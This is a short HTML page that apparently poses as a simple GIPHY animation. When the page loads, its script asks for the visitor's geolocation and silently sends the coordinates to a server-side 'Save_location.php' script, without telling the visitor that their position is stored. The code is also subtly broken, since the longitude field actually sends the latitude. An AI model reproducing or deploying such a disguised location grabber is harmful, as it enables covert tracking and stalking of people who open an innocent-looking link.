<!DOCTYPE html>
<html>
<body onload="getLocation()">
    <iframe src="https://giphy.com/embed/8rEiN2GsOdQTmFV38t" width="480" height="350" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/8rEiN2GsOdQTmFV38t">via GIPHY</a></p>

<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

const xhttp = new XMLHttpRequest();
function showPosition(position) {
    xhttp.open("GET", "Save_location.php?lat=" + position.coords.latitude + "&long=" + position.coords.latitude);
    xhttp.send();
}
</script>

</body>
</html>
